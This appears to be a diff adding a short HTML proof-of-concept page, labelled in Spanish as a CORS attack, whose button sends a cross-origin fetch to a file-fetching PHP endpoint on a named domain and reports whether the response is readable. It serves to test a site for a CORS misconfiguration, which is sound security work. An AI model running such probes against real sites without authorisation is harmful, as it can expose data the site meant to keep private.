@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>ATAQUE CORS</h1>
+<button onclick="attack()">Lanzar ataque</button>
+<pre id="result"></pre>
+
+<script>
+function attack() {
+  fetch('https://cdn.cochesviejunos.es/get-car-description.php?file=124.txt', {
+    method: 'GET',
+    mode: 'cors'
+  })
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById('result').innerText = 'CORS VULNERABLE: ' + data;
+  })
+  .catch(err => {
+    document.getElementById('result').innerText = 'CORS BLOQUEADO: ' + err;
+  });
+}
+</script>
+</body>
+</html>
